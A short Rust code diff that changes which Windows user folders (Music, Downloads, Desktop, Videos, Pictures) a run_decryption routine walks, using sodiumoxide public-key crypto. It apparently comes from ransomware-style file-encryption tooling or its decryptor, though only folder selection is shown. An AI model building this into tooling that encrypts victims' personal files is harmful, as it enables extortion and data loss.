@@ -14,7 +14,7 @@ use sodiumoxide::crypto::box_::PublicKey;
 
 use windows::{
     Win32::UI::Shell::{
-        FOLDERID_Desktop, FOLDERID_Documents, FOLDERID_Music, FOLDERID_Videos, KNOWN_FOLDER_FLAG,
+        FOLDERID_Desktop, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Pictures, KNOWN_FOLDER_FLAG,
         SHGetKnownFolderPath,
     },
     core::PWSTR,
@@ -56,9 +56,10 @@ async fn run_decryption() -> Result<(), Box<dyn std::error::Error>> {
 
     let paths = [
         FOLDERID_Music,
-        FOLDERID_Documents,
+        FOLDERID_Downloads,
         FOLDERID_Desktop,
         FOLDERID_Videos,
+        FOLDERID_Pictures,
     ];
     
     unsafe {
